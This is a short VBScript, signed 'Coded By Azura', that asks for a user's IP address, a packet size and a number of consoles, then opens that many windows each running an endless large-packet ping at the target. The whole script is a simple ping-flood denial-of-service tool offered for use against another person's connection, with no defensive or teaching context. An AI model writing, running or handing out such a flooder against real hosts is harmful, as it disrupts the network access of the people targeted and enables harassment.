Dim Packets
Dim ip
Dim Amount
Public Console
    Set Console = WScript.CreateObject ("WScript.shell")
    ip = inputBox("Input IP Of User","MsPing","Ip")
    Packets = inputBox("Input Number Of Packets","MsPing","Packets")
    Amount = inputBox("Amount Of MsPing Consoles To Open")
Dim i
i=10
    For i=0 To Amount
    Console.run "ping " & Ip & " -t -l " & Packets
    Next
    ''Coded By Azura
